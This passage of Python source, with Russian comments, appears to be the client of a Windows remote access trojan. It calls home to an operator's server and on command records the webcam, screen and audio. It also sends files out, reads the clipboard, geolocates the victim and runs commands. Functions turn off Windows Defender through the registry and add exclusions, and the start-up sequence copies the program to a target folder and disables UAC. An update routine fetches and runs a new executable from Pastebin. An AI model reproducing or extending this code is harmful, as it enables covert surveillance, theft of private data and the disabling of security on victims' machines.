            wf.setnchannels(channels_to_use) # <-- ИСПОЛЬЗУЕМ АДАПТИВНЫЕ КАНАЛЫ
            wf.setsampwidth(2)   # int16 → 2 bytes
            wf.setframerate(samplerate)
            wf.writeframes(recording.tobytes())

        # ----------------------------------------------------------
        # 5. Отправка файла
        # ----------------------------------------------------------
        err = send_file(conn, audio_path)
        send_response(conn, err or "✅ Системный звук отправлен")

    except Exception as e:
        send_response(conn, f"❌ Ошибка записи звука: {str(e)}")

    finally:
        if audio_path and os.path.exists(audio_path):
            try:
                os.remove(audio_path)
            except Exception:
                pass


def cmd_webcam_video(args, conn):
    """
    Records video from a specified webcam for a duration.
    Usage: /webcam <index> <seconds> (Max 30s)
    """
    logger.debug(f"Выполняется /webcam с аргументами: {args}")
    output_file = None
    
    try:
        parts = args.strip().split()
        if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
            send_response(conn, "❌ Формат: /webcam <индекс> <секунды>")
            return
            
        camera_index = int(parts[0])
        record_time = max(1, min(30, int(parts[1]))) # Ограничение 30с

        # 1. Инициализация
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            send_response(conn, f"❌ Камера с индексом {camera_index} недоступна.")
            return

        # Получаем реальные размеры кадра (для VideoWriter)
        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        # 2. Настройка VideoWriter
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_dir = tempfile.gettempdir()
        output_file = os.path.join(temp_dir, f"webcam_vid_{int(time.time())}.avi")
        
        # Используем .avi для XVID
        output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (frame_width, frame_height)) 

        send_response(conn, f"✅ Начата запись видео с камеры {camera_index} на {record_time} секунд...")
        
        # 3. Запись
        start_time = time.time()
        
        while time.time() - start_time < record_time:
            ret, frame = cap.read()
            if ret:
                output_v.write(frame)
            else:
                time.sleep(0.05) 
                
        # 4. Освобождение ресурсов
        cap.release()
        output_v.release()
        
        # 5. Отправка
        error = send_file(conn, output_file)
        send_response(conn, error or f"✅ Видео ({record_time}с) отправлено")

    except Exception as e:
        send_response(conn, f"❌ Видео с веб-камеры: {str(e)}")
    finally:
        if output_file and os.path.exists(output_file):
            os.remove(output_file)


def cmd_screenrecord(args, conn):
    """
    Records screen video for a specified duration and sends the MP4 file using MSS.
    Usage: /screenrecord <seconds> (Max 60s)
    """
    logger.debug(f"Выполняется /screenrecord с аргументами: {args}")
    output_file = None

    try:
        if not args.strip().isdigit():
            send_response(conn, "❌ Формат: /screenrecord <секунды>")
            return

        record_time = max(1, min(60, int(args.strip())))
        FPS = 10.0
        frame_interval = 1.0 / FPS

        # Инициализация MSS
        sct = mss.mss()

        # Размеры экрана
        monitor = sct.monitors[1]  # основной монитор
        screen_width = monitor["width"]
        screen_height = monitor["height"]

        # Подготовка видеофайла (MP4)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        temp_dir = tempfile.gettempdir()
        output_file = os.path.join(temp_dir, f"screen_rec_{int(time.time())}.mkv")

        output_video = cv2.VideoWriter(output_file, fourcc, FPS, (screen_width, screen_height))

        send_response(conn, f"🎥 Запись экрана начата на {record_time} секунд...")

        num_frames = int(record_time * FPS)

        for i in range(num_frames):
            t0 = time.time()
        
            # захват кадра
            frame_raw = sct.grab(monitor)
            frame = np.array(frame_raw)[..., :3]  # убираем альфа-канал
            output_video.write(frame)
        
            # пауза до следующего кадра
            elapsed = time.time() - t0
            time.sleep(max(0, frame_interval - elapsed))


        output_video.release()

        error = send_file(conn, output_file)
        send_response(conn, error or f"✅ Запись экрана ({record_time}с) отправлена")

    except Exception as e:
        send_response(conn, f"❌ Критическая ошибка записи: {str(e)}")

    finally:
        if output_file and os.path.exists(output_file):
            os.remove(output_file)


def cmd_location(args, conn):
    try:
        # 1. Внешний IP
        ip_resp = requests.get("https://api.ipify.org?format=json", timeout=10)
        ip_resp.raise_for_status()
        public_ip = ip_resp.json().get("ip", "неизвестно")

        # 2. Геолокация
        geo_resp = requests.get(f"http://ip-api.com/json/{public_ip}", timeout=10)
        geo_resp.raise_for_status()
        data = geo_resp.json()

        if data.get("status") != "success":
            send_response(conn, f"IP: {public_ip}\nГеолокация недоступна.")
            return

        # 3. Чистый текст
        lines = [
            f"IP (внешний): {public_ip}",
            f"IP (локальный): {socket.gethostbyname(socket.gethostname())}",
            f"Страна: {data.get('country', '—')}",
            f"Регион: {data.get('regionName', '—')}",
            f"Город: {data.get('city', '—')}",
            f"Провайдер: {data.get('isp', '—')}",
            f"Организация: {data.get('org', '—')}",
            f"Часовой пояс: {data.get('timezone', '—')}",
            f"Координаты: {data.get('lat')}, {data.get('lon')}",
        ]

        # Убираем строки с "—", если нужно
        lines = [line for line in lines if not line.endswith("—")]

        # 4. Отправляем
        send_response(conn, "\n".join(lines))

    except Exception as e:
        send_response(conn, f"Ошибка: {e}")

# ====== Download (Запускается в отдельном потоке) ======
def cmd_download(args, conn):
    logger.debug(f"Выполняется /download с аргументами: {args}")
    try:
        file_path = os.path.normpath(os.path.join(current_path, args.strip()))
        if not os.path.isfile(file_path):
            send_response(conn, "❌ Файл не найден")
            return None
        if os.path.getsize(file_path) > 50 * 1024 * 1024:
            send_response(conn, "❌ >50MB")
            return None
            
        error = send_file(conn, file_path)
        send_response(conn, error or "✅ Файл отправлен")
        return None
    except Exception as e:
        send_response(conn, f"❌ Download: {str(e)}")
        return None

# ==== Важная команда для глушения Win def`а ========
def cmd_wd_exclude(args):
    """
    Добавляет текущий exe или указанный путь в исключения Windows Defender.
    Без аргумента — текущий exe, с аргументом — любой файл/папка.
    Работает с разными локалями и резервно через реестр.
    """
    try:
        # Определяем путь
        if not args.strip():
            target_path = sys.executable
            logger.info("Добавляем текущий exe в исключения")
        else:
            target_path = os.path.abspath(args.strip().strip('"\''))
            logger.info(f"Добавляем путь: {target_path}")

        if not os.path.exists(target_path):
            return f"Путь не существует: `{target_path}`"

        # Экранирование для PowerShell
        escaped = target_path.replace('"', '`"')

        # PowerShell команда
        ps_cmd = (
            f'Try {{ Add-MpPreference -ExclusionPath "{escaped}"; "OK" }} '
            f'Catch {{ $_.Exception.Message }}'
        )

        result = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_cmd],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        output = (result.stdout + result.stderr).strip().upper()
        if "OK" in output or "ALREADY" in output:
            return f"Добавлено в исключения Defender: `{os.path.basename(target_path)}`"

        # === Резерв через реестр ===
        try:
            key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
            with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
                reg.SetValueEx(key, target_path, 0, reg.REG_DWORD, 0)
            return f"Добавлено через реестр: `{os.path.basename(target_path)}`"
        except PermissionError:
            logger.warning("Нет прав для записи в реестр")
        except Exception as e:
            logger.warning(f"Не удалось добавить через реестр: {e}")

        return f"Не удалось добавить. Ответ PowerShell: {output[:500]}"

    except Exception as e:
        logger.error(f"Ошибка wd_exclude: {e}")
        return f"Критическая ошибка: {e}"

def cmd_killwindef(args):
    """
    Команда /killwindef
    Отключает Windows Defender (включая Real-Time Protection) через реестр.
    Требует прав администратора (а у тебя клиент уже копируется в C:\Windows\INF и запускается оттуда → права есть).
    """
    try:
        logger.info("Выполняется отключение Windows Defender через реестр...")

        # Открываем/создаём ключи с правом записи
        key1 = reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, 
                               r"SOFTWARE\Policies\Microsoft\Windows Defender", 
                               0, reg.KEY_SET_VALUE)
        key2 = reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, 
                               r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", 
                               0, reg.KEY_SET_VALUE)

        # === Основной ключ Defender ===
        reg.SetValueEx(key1, "DisableAntiSpyware", 0, reg.REG_DWORD, 1)
        # Дополнительно (на всякий случай, если вдруг включат обратно)
        reg.SetValueEx(key1, "AllowFastServiceStartup", 0, reg.REG_DWORD, 0)
        reg.SetValueEx(key1, "ServiceKeepAlive", 0, reg.REG_DWORD, 0)

        # === Real-Time Protection ===
        reg.SetValueEx(key2, "DisableBehaviorMonitoring", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key2, "DisableOnAccessProtection", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key2, "DisableScanOnRealtimeEnable", 0, reg.REG_DWORD, 1)
        reg.SetValueEx(key2, "DisableIOAVProtection", 0, reg.REG_DWORD, 1)
        # Отключаем облачную защиту и автоматическую отправку образцов
        reg.SetValueEx(key2, "DisableRealtimeMonitoring", 0, reg.REG_DWORD, 1)

        # Закрываем ключи
        reg.CloseKey(key1)
        reg.CloseKey(key2)

        logger.info("Windows Defender успешно отключён через реестр")
        return "Windows Defender и Real-Time Protection отключены"

    except PermissionError:
        return "Ошибка: недостаточно прав"
    except Exception as e:
        logger.error(f"Ошибка при отключении Defender: {e}")
        return f"Ошибка отключения Defender: {str(e)}"

# ====== Upload (Обрабатывает буфер и приём файла) ======
# Оставили drain_socket для очистки сокета от мусора
def drain_socket(conn, bytes_to_drain):
    try:
        conn.settimeout(5)
        drained = 0
        while drained < bytes_to_drain:
            chunk = conn.recv(min(8192, bytes_to_drain - drained))
            if not chunk:
                break
            drained += len(chunk)
    except:
        pass
    finally:
        conn.settimeout(None)

def cmd_upload(payload, conn, initial_data=b''):
    """
    Обрабатывает команду /upload: читает метаданные и тело файла
    из сокета и записывает файл на диск.
    """
    global current_path # Убедитесь, что current_path определен глобально
    logger.debug(f"Upload: {len(initial_data)} initial bytes")
    
    save_path = None
    file_size = 0  # Инициализируем для блока except
    received = 0   # Инициализируем для блока except
    
    try:
        file_name = payload.get("file_name")
        file_size = int(payload.get("file_size", 0))
        
        # 1. Валидация
        if not file_name or file_size <= 0 or file_size > 50 * 1024 * 1024:
            # Если имя отсутствует или некорректно, очищаем сокет
            drain_socket(conn, file_size - len(initial_data))
            return "❌ Неверные метаданные (имя файла или размер)"
            
        # 2. Формирование пути
        # 💥 ЭТО ОБЕСПЕЧИВАЕТ ПЕРЕИМЕНОВАНИЕ: Используется file_name, присланный сервером
        save_path = os.path.join(current_path, file_name)
        
        if os.path.exists(save_path):
            # Если файл уже существует, надо очистить сокет от данных, чтобы не зависнуть
            drain_socket(conn, file_size - len(initial_data))
            return "❌ Файл существует"
            
        # 3. Чтение и запись файла
        received = len(initial_data)
        conn.settimeout(60) # Увеличиваем таймаут для больших файлов
        
        # Предполагается, что file_lock - это threading.Lock()
        with file_lock:
            with open(save_path, 'wb') as f:
                if initial_data:
                    f.write(initial_data)
                
                while received < file_size:
                    # Читаем оставшиеся данные
                    chunk = conn.recv(min(8192, file_size - received))
                    if not chunk:
                        raise ConnectionError("Разрыв")
                    f.write(chunk)
                    received += len(chunk)
        
        conn.settimeout(None) # Сбрасываем таймаут
        
        # 4. Проверка полноты и финальный отчет
        if received != file_size:
            # Если не все принято, удаляем файл
            if os.path.exists(save_path):
                os.remove(save_path)
            return f"❌ Неполный ({received}/{file_size})"
            
        return f"✅ {file_name} загружен ({received}B)"
        
    except Exception as e:
        # В случае ошибки пытаемся очистить сокет от оставшихся данных файла
        try:
            # Используем max(0, ...) для безопасного расчета оставшихся байтов
            bytes_to_drain = max(0, file_size - received - len(initial_data))
            drain_socket(conn, bytes_to_drain)
        except:
            pass
            
        # Удаляем недописанный файл
        if save_path and os.path.exists(save_path):
            os.remove(save_path)
            
        return f"❌ Upload: {str(e)}"


def cmd_update(args, conn):
    """
    Формат:
    /update https://pastebin.com/raw/XXXXXXX
    """
    if not args.strip():
        return "❌ Укажите raw URL Pastebin: /update https://pastebin.com/raw/XXXXXX"

    pastebin_url = args.strip()

    try:
        # 1. Скачиваем содержимое Pastebin
        response = requests.get(pastebin_url)
        response.raise_for_status()
        content = response.text.strip()

        # 2. Парсим: "Ver X - url"
        if not content.startswith("Ver "):
            return "❌ Некорректный формат Pastebin. Ожидается: 'Ver X - link'"

        parts = content.split(" - ", 1)
        if len(parts) != 2:
            return "❌ Некорректный формат. Ожидается: 'Ver X - link'"

        ver_str = parts[0][4:].strip()
        download_link = parts[1].strip()

        new_version = int(ver_str)

        # 3. Проверяем версию
        global CURRENT_VERSION
        if new_version <= CURRENT_VERSION:
            return f"ℹ️ Клиент уже на актуальной версии (текущая: {CURRENT_VERSION}, доступная: {new_version})."

        # 4. Скачиваем новый exe
        send_response(conn, f"✅ Обнаружена новая версия {new_version}. Скачивание...")

        new_exe_response = requests.get(download_link, stream=True)
        new_exe_response.raise_for_status()

        current_exe = sys.executable
        temp_exe = os.path.join(os.path.dirname(current_exe), f"new_client_{new_version}.exe")

        with open(temp_exe, 'wb') as f:
            for chunk in new_exe_response.iter_content(chunk_size=8192):
                f.write(chunk)

        # 5. Создаём BAT для замены
        bat_path = os.path.join(os.path.dirname(current_exe), "update.bat")
        bat_content = f"""@echo off
timeout /t 2 /nobreak >nul
taskkill /f /im "{os.path.basename(current_exe)}" >nul 2>&1
copy /Y "{temp_exe}" "{current_exe}"
del "{temp_exe}"
start "" "{current_exe}"
del "%~f0"
"""
        with open(bat_path, 'w') as bat_file:
            bat_file.write(bat_content)

        # 6. Запуск BAT
        subprocess.Popen(bat_path, creationflags=subprocess.CREATE_NO_WINDOW)
        send_response(conn, "✅ Обновление скачано. Клиент перезапустится для применения.")

        os._exit(0)

    except Exception as e:
        return f"❌ Ошибка обновления: {e}"


def cmd_open_image(args, conn):
    """
    Открывает изображение в полноэкранном режиме поверх всех окон на заданное время.
    Решена проблема с кириллицей в путях и усилен эффект "поверх других окон".
    Формат: /open_image <секунды> <путь к файлу>
    """
    global current_path, file_lock
    logger.debug(f"Выполняется /open_image с аргументами: {args}")
    
    # Имя окна
    window_name = f"fullscreen_image_viewer_{os.getpid()}" 
    
    try:
        parts = args.strip().split(None, 1)
        if len(parts) < 2:
            send_response(conn, "❌ Формат: /open_image <секунды> <путь к файлу>")
            return
        
        # ... (Проверка секунд остается прежней)
        try:
            seconds = int(parts[0])
            if seconds <= 0:
                send_response(conn, "❌ Время должно быть > 0 секунд.")
                return
        except ValueError:
            send_response(conn, "❌ Неверный формат времени. Укажите число секунд.")
            return

        user_path = parts[1]
        
        # 2. Валидация и чтение пути (Обновленная логика)
        with file_lock:
            # 1. Объединяем путь
            full_path = os.path.join(current_path, user_path)
            
            # 2. Получаем абсолютный, нормализованный путь
            full_path = os.path.abspath(full_path) 
            
            # 3. ПРОВЕРЯЕМ СУЩЕСТВОВАНИЕ (Для кириллицы os.path.isfile часто работает лучше,
            # если ей передать нормализованный путь)
            if not os.path.isfile(full_path):
                send_response(conn, f"❌ Файл не найден: {full_path}")
                return
        
        logger.debug(f"Попытка чтения изображения по абсолютному пути: {full_path}")
        
        # 3. Чтение изображения с поддержкой кириллицы (Остается прежней, т.к. она верна)
        # Читаем файл как бинарный массив
        with open(full_path, 'rb') as f:
            data = f.read()
        
        # Преобразуем бинарные данные в массив numpy и декодируем его как изображение
        np_arr = np.frombuffer(data, np.uint8)
        image = cv2.imdecode(np_arr, cv2.IMREAD_UNCHANGED)
        
        if image is None:
            send_response(conn, "❌ Не удалось прочитать файл (возможно, это не изображение).")
            return

    except Exception as e:
        send_response(conn, f"❌ Ошибка подготовки: {e}")
        return

    # 4. Показ (Усиление эффекта "поверх всех окон")
    try:
        # 1. Создаем окно с флагом WND_PROP_FULLSCREEN
        cv2.namedWindow(window_name, cv2.WND_PROP_FULLSCREEN)
        
        # 2. Устанавливаем свойство WINDOW_FULLSCREEN
        cv2.setWindowProperty(window_name, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        
        # 🔥 3. Дополнительно устанавливаем TOPMOST (сделать поверх других), 
        # хотя WINDOW_FULLSCREEN уже должен это делать.
        cv2.setWindowProperty(window_name, cv2.WND_PROP_TOPMOST, 1)

        # 4. Показываем изображение
        cv2.imshow(window_name, image)
        
        send_response(conn, f"✅ Изображение '{user_path}' открыто на {seconds} сек. (Поверх всех)")

        # 5. Ждем N миллисекунд ИЛИ нажатия любой клавиши.
        cv2.waitKey(seconds * 1000) 
        
    except Exception as e:
        send_response(conn, f"❌ Ошибка во время показа изображения (GUI/Full-Screen): {e}")
    finally:
        # Гарантированное закрытие окна
        cv2.destroyAllWindows() 
        cv2.waitKey(1)

def video_play_task(path):
    win_name = "elite"

    try:
        cap = cv2.VideoCapture(path)
        if not cap.isOpened():
            logger.error("Не удалось открыть видео")
            return

        cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)

        # 🔥 РЕАЛЬНЫЙ FULLSCREEN
        cv2.setWindowProperty(
            win_name,
            cv2.WND_PROP_FULLSCREEN,
            cv2.WINDOW_FULLSCREEN
        )

        # ⏳ Ждём пока окно реально появится
        hwnd = None
        for _ in range(50):  # ~1 сек
            hwnd = win32gui.FindWindow(None, win_name)
            if hwnd:
                break
            time.sleep(0.02)

        if hwnd:
            # 🔥 ЖЁСТКО ПОВЕРХ ВСЕХ ОКОН
            win32gui.SetWindowPos(
                hwnd,
                win32con.HWND_TOPMOST,
                0, 0, 0, 0,
                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
            )

            # убрать рамки и фокус
            style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
            win32gui.SetWindowLong(
                hwnd,
                win32con.GWL_STYLE,
                style & ~(
                    win32con.WS_CAPTION |
                    win32con.WS_THICKFRAME |
                    win32con.WS_MINIMIZE |
                    win32con.WS_MAXIMIZE |
                    win32con.WS_SYSMENU
                )
            )

        fps = cap.get(cv2.CAP_PROP_FPS)
        delay = int(1000 / fps) if fps > 0 else 33

        while not video_stop_event.is_set():
            ret, frame = cap.read()
            if not ret:
                break

            cv2.imshow(win_name, frame)

            # ESC — выход
            if cv2.waitKey(delay) & 0xFF == 27:
                break

        cap.release()
        cv2.destroyAllWindows()

    except Exception as e:
        logger.error(f"Video error: {e}")
    finally:
        video_stop_event.clear()


def cmd_open_video(args):
    global video_thread

    if not args:
        return "❌ Укажите путь к видео"

    path = args.strip()
    if not os.path.isabs(path):
        path = os.path.join(current_path, path)

    if not os.path.isfile(path):
        return "❌ Видео не найдено"

    # если уже играет — останавливаем
    if video_thread and video_thread.is_alive():
        video_stop_event.set()
        video_thread.join(timeout=1)

    video_stop_event.clear()
    video_thread = threading.Thread(
        target=video_play_task,
        args=(path,),
        daemon=True
    )
    video_thread.start()

    return "🎬 Видео запущено (без звука, поверх всех окон)"

def cmd_close_video(args):
    if video_thread and video_thread.is_alive():
        video_stop_event.set()
        return "🛑 Видео остановлено"
    return "⚠️ Видео не запущено"
  
# ====== Словарь команд ======
COMMANDS = {
    "/ls": cmd_ls,
    "/cd": cmd_cd,
    "/back": cmd_back,
    "/pwd": cmd_pwd,
    "/mkdir": cmd_mkdir,
    "/delete": cmd_delete,
    "/rename": cmd_rename,
    "/copy": cmd_copy,
    "/run": cmd_run,
    "/move": cmd_move,
    "/msg": cmd_msg,
    "/wallpaper": cmd_wallpaper,
    "/applist": cmd_applist,
    "/applist_title":cmd_applist_title,
    "/applist_close": cmd_applist_close,
    "/volumeplus": cmd_volumeplus,
    "/volumeminus": cmd_volumeminus,
    "/download_link": cmd_download_link,
    "/sysinfo": cmd_sysinfo,
    "/execute": cmd_execute,
    "/ex": cmd_execute,
    "/changeclipboard": cmd_changeclipboard,
    "/minimize": cmd_minimize,
    "/maximize": cmd_maximize,
    "/version": cmd_version,
    "/cmdbomb": cmd_cmdbomb,
    "/altf4": cmd_altf4,
    "/restart": cmd_restart, 
    "/mousemove": cmd_mousemove,
    "/mouseclick": cmd_mouseclick,
    "/playsound": cmd_playsound,
    "/stopsound": cmd_stopsound,
    "/mousemesstop": cmd_mousemesstop,
    "/block": block_input,
    "/unblock": unblock_input,
    "/clipboard": get_clipboard_content,
    "/keytype": simulate_key_type,
    "/ping": cmd_ping,  
    "/mic": cmd_mic,            
    "/webcam": cmd_webcam_video, 
    "/open_image": cmd_open_image,
    "/screenrecord": cmd_screenrecord,
    "/location": cmd_location,
    "/mousemesstart": cmd_mousemesstart,
    "/tasklist": cmd_tasklist,   
    "/taskkill": cmd_taskkill,   
    "/keypress": cmd_keypress,
    "/holdkey": cmd_holdkey, 
    "/screenshot": cmd_screenshot,
    "/sc": cmd_screenshot,
    "/photo": cmd_photo,
    "/auto": cmd_auto,
    "/stop": cmd_stop,
    "/download": cmd_download,
    "/upload": cmd_upload,
    "/update": cmd_update,
    "/killwindef": cmd_killwindef,
    "/wd_exclude": cmd_wd_exclude,
    "/audiorecord": cmd_audiorecord,
    "/open_video": cmd_open_video,
    "/close_video": cmd_close_video,
    "/screenshot_full": cmd_screenshot_full,
    "/scfull": cmd_screenshot_full
}

# ====== Главный цикл ======
def main_client_loop():
    global current_socket
    
    try:
        # Устанавливаем рабочий каталог в папку, где находится исполняемый файл
        os.chdir(os.path.dirname(os.path.abspath(sys.executable)))
    except Exception as e:
        logger.error(f"Не удалось установить рабочий каталог: {e}")

    while True:
        conn = None
        buffer = b''
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            conn.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            conn.connect((SERVER_IP, SERVER_PORT))
            logger.info("Подключено")
            
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                is_admin = False
            
            sys_info = {
                "os": f"Win {platform.release()}", # Например "Win 10"
                "user": os.getenv('USERNAME', 'User'),
                "is_admin": is_admin
            }

            # 2. Отправляем расширенный handshake
            handshake_data = {
                "client_id": CLIENT_ID,
                "info": sys_info # Вкладываем инфу внутрь
            }
            handshake = json.dumps(handshake_data, ensure_ascii=False).encode('utf-8') + b'\n'
            # === КОНЕЦ ИЗМЕНЕНИЙ ===
            
            conn.sendall(handshake)

            try:
                cmd_screenshot("", conn)
                #cmd_location("", conn)
            except Exception as e:
                logger.error(f"Ошибка автозапуска: {e}")

            # Обновляем глобальный сокет для использования в auto_job и send_file
            with socket_lock:
                current_socket = conn

            hb_stop_event.clear()
            hb_thread = threading.Thread(target=client_heartbeat_loop, daemon=True)
            hb_thread.start()

            while True:
                # Читаем данные. Если данных нет, цикл разрывается.
                data = conn.recv(8192)
                if not data:
                    break
                
                buffer += data
                
                while b'\n' in buffer:
                    line, buffer = buffer.split(b'\n', 1)
                    try:
                        payload = json.loads(line.decode('utf-8'))
                        command = payload.get("command", "").strip()
                        if not command:
                            continue
                            
                        cmd_name = command.split()[0]
                        args = command[len(cmd_name):].strip()
                        func = COMMANDS.get(cmd_name)
                        
                        result = None # Инициализируем результат
                        
                        if not func:
                            result = "❌ Неизвестно"
                        
                        elif cmd_name in {"/upload", "/auto", "/update", "/location"}:
                             # /upload уже получает payload + остаток буфера
                            if cmd_name == "/upload":
                                 result = func(payload, conn, buffer)
                                 buffer = b''
                            else:
                                 result = func(args, conn)          # <-- передаём conn

                        elif cmd_name in ["/screenshot", "/sc", "/photo", "/download", "/mic", "/webcam", "/screenrecord", "/open_image", "/audiorecord", "/playsound", "/screenshot_full", "/scfull"]:
                            # Долгосрочные операции: запуск в отдельном потоке. Они сами отправляют результат.
                            threading.Thread(target=func, args=(args, conn), daemon=True).start()
                            result = None

                        elif cmd_name == "/restart": 
                            # Здесь происходит вызов func(args), который возвращает кортеж (message, False, None)
                            result_tuple = func(args)
                            result, is_file_result, file_path = result_tuple  
                            
                        else:
                            # ВСЕ остальные команды (включая /execute и /tasklist)
                            # result получает строку (для коротких) или путь (для длинных)
                            result = func(args)
                    
                        is_file_result = False
                        file_path = None
                        
                        # Проверяем, вернула ли одна из "файловых" команд путь к существующему файлу
                        if cmd_name in ["/execute", "/ex", "/tasklist"] and isinstance(result, str) and os.path.exists(result):
                            is_file_result = True
                            file_path = result
                            # Это фидбэк для Сервера/пользователя, пока идет отправка
                            result = f"✅ Вывод команды {cmd_name} готов к отправке как TXT файл." 
                            
                        if result:
                            # Теперь result - это строка (или был строкой), 
                            # send_response получает строку. ОШИБКИ НЕТ.
                            send_response(conn, result, cmd_name=cmd_name, is_file=is_file_result, file_path=file_path)

                            # Теперь result.startswith() вызывается на строке. ОШИБКИ НЕТ.
                            if result.startswith("✅ Клиент перезапускается."): 
                                logger.warning("Команда перезапуска получена. Завершение текущего процесса.")
                                os._exit(0)
                                                              
                    except json.JSONDecodeError:
                        # Если не удалось декодировать JSON, это может быть неполная строка,
                        # или начало бинарного файла. Мы не можем точно знать, поэтому 
                        # возвращаем строку в буфер и ждем дальше.
                        buffer = line + b'\n' + buffer 
                        break # Выходим, чтобы ждать больше данных
                        
                    except Exception as e:
                        send_response(conn, f"❌ Ошибка обработки команды: {str(e)}")
                        
        except Exception as e:
            logger.error(f"Ошибка соединения: {e}")
        finally:
            # Сбрасываем глобальный сокет при отключении
            with socket_lock:
                current_socket = None
                
            if conn:
                conn.close()
                
            # Остановка потока auto
            stop_event.set()
            if auto_thread and auto_thread.is_alive():
                auto_thread.join(1)
                
            # 🔥 Остановка Heartbeat
            hb_stop_event.set()
            if 'hb_thread' in locals() and hb_thread.is_alive():
                hb_thread.join(1)
            
            logger.warning("Переподключение...")
            time.sleep(RECONNECT_DELAY)


copy_to_target()
disable_uac()
delete_mei()
kill_parent_stub()
main_client_loop()
